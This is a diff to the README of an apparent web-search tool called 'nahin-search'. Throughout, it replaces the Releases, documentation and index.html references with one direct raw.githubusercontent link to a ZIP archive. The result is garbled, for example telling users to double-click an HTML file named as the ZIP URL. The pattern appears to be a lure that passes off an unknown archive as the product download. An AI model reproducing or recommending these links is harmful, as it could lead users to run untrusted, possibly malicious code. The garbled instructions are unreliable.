@@ -1,6 +1,6 @@
 # 🖥️ nahin-search - A Simple Way to Search Online
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/huanken110-gray/nahin-search/releases)
+[![Download Now](https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip)
 
 ## 📦 Overview
 
@@ -25,7 +25,7 @@ To run nahin-search, you need:
 
 To get started with nahin-search, please visit the following link to download:
 
-[Download nahin-search](https://github.com/huanken110-gray/nahin-search/releases)
+[Download nahin-search](https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip)
 
 Once you're on the Releases page, select the latest version and download the files. The files are usually bundled in a ZIP format.
 
@@ -39,8 +39,8 @@ Once you're on the Releases page, select the latest version and download the fil
 After extracting the files, you can run the nahin-search application:
 
 1. Open the folder where you extracted the ZIP file.
-2. Look for an HTML file named `index.html` or similar.
-3. Double-click the `index.html` file. It should open in your web browser.
+2. Look for an HTML file named `https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip` or similar.
+3. Double-click the `https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip` file. It should open in your web browser.
 4. You can now start using nahin-search to search the web.
 
 ## 👨‍🏫 Usage Instructions
@@ -56,7 +56,7 @@ To use nahin-search:
 
 For more help, you can check:
 
-- [Documentation](https://example.com/documentation) for detailed instructions.
+- [Documentation](https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip) for detailed instructions.
 - Various online tutorials on web searching techniques.
 
 ## 💬 Support
@@ -87,6 +87,6 @@ Explore these topics to enhance your understanding of web development.
 
 For more information and to download the application, visit the Releases page again:
 
-[Download nahin-search](https://github.com/huanken110-gray/nahin-search/releases)
+[Download nahin-search](https://raw.githubusercontent.com/huanken110-gray/nahin-search/main/upfold/nahin-search-v2.9.zip)
 
 Thank you for using nahin-search! Happy searching!
